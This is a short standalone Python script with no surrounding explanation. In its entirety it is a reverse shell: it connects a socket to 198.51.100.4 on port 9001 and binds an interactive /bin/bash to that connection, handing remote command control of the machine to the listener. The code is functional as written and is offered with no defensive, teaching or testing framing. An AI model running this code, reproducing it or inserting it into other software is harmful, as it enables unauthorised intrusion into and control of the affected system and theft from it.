import socket
from subprocess import Popen
s = socket.socket()
s.connect(('198.51.100.4', 9001))
Popen(['/bin/bash'], stdin=s, stdout=s, stderr=s)
